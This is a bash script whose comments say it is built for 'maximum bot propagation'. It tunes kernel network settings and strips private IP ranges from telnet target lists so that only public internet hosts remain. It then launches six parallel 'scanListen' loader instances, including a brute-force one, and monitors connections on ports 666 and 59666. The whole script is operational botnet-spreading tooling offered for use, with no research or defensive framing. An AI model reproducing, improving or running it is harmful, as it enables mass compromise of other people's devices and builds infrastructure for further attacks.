#!/bin/bash

# Improved scanListen optimization script for maximum bot propagation
echo "=== Starting Improved scanListen Optimization ==="

# System optimizations
echo "Applying system optimizations..."
ulimit -n 999999
echo 1 > /proc/sys/net/ipv4/tcp_tw_reuse
echo 30 > /proc/sys/net/ipv4/tcp_fin_timeout
echo 1 > /proc/sys/net/ipv4/tcp_tw_recycle
echo 65536 > /proc/sys/net/core/somaxconn
echo 65536 > /proc/sys/net/core/netdev_max_backlog
echo 1 > /proc/sys/net/ipv4/tcp_no_delay_ack
echo 1 > /proc/sys/net/ipv4/tcp_low_latency

# Kill existing processes
echo "Stopping existing scanListen processes..."
pkill -f scanListen
sleep 3

# Create optimized target files
echo "Creating optimized target files..."

# Filter out local network ranges and create clean target lists
grep -v "^192\.168\." telnet.txt > telnet_clean.txt
grep -v "^10\." telnet_clean.txt > telnet_clean2.txt
grep -v "^172\.1[6-9]\." telnet_clean2.txt > telnet_clean3.txt
grep -v "^172\.2[0-9]\." telnet_clean3.txt > telnet_clean4.txt
grep -v "^172\.3[0-1]\." telnet_clean4.txt > telnet_clean5.txt
mv telnet_clean5.txt telnet_clean.txt
rm telnet_clean2.txt telnet_clean3.txt telnet_clean4.txt

# Split targets for parallel processing
split -l 200 telnet_clean.txt telnet_part_
split -l 100 big.txt big_part_
split -l 50 list.txt list_part_

# Start multiple optimized scanListen instances
echo "Starting optimized scanListen instances..."

# Instance 1: High-performance telnet scanning
echo "Starting telnet instance 1..."
./scanListen loader1 < telnet_part_aa &
SCAN1_PID=$!

# Instance 2: High-performance telnet scanning  
echo "Starting telnet instance 2..."
./scanListen loader2 < telnet_part_ab &
SCAN2_PID=$!

# Instance 3: Big targets
echo "Starting big targets instance..."
./scanListen loader3 < big_part_aa &
SCAN3_PID=$!

# Instance 4: List targets
echo "Starting list targets instance..."
./scanListen loader4 < list_part_aa &
SCAN4_PID=$!

# Instance 5: Brute force
echo "Starting brute force instance..."
./scanListen loader5 < brute.txt &
SCAN5_PID=$!

# Instance 6: Enhanced targets (filtered)
echo "Starting enhanced targets instance..."
grep -v "^192\.168\." enhanced_targets.txt | grep -v "^10\." | grep -v "^172\.1[6-9]\." | grep -v "^172\.2[0-9]\." | grep -v "^172\.3[0-1]\." > enhanced_clean.txt
./scanListen loader6 < enhanced_clean.txt &
SCAN6_PID=$!

echo "=== Improved ScanListen Optimization Complete ==="
echo "Instance 1 (Telnet 1): PID $SCAN1_PID"
echo "Instance 2 (Telnet 2): PID $SCAN2_PID" 
echo "Instance 3 (Big Targets): PID $SCAN3_PID"
echo "Instance 4 (List Targets): PID $SCAN4_PID"
echo "Instance 5 (Brute Force): PID $SCAN5_PID"
echo "Instance 6 (Enhanced Clean): PID $SCAN6_PID"

# Monitor performance
echo "Starting performance monitoring..."
while true; do
    sleep 30
    echo "=== Performance Report ==="
    echo "Active scanListen processes:"
    ps aux | grep scanListen | grep -v grep | wc -l
    echo "Total connections:"
    ss -tn | grep -E "(666|59666)" | wc -l
    echo "Memory usage:"
    ps aux | grep scanListen | grep -v grep | awk '{sum+=$6} END {print "Total RSS: " sum " KB"}'
    echo "========================"
done
